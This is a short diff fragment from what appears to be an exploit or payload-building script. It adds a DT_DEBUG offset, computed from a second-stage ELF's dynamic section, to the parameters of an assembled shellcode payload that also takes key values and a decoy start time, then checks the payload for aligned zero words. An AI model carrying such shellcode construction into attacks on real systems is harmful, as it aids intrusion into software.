@@ -304,6 +304,7 @@ payload = assemble_shellcode(
     KEY0=ACTUAL_KEY[0],
     KEY1=ACTUAL_KEY[1],
     START_TIME=DECOY_START_TIME,
+    DT_DEBUG_OFFSET=stage2.dynamic_value_vaddr_by_tag("DT_DEBUG") - (text_gap._base_address & ~0xFFF),
 )
 for i in range(0, len(payload), 4):
     assert payload[i:i+4] != b"\x00" * 4, f"Payload must not contain aligned zero dword: {i}"
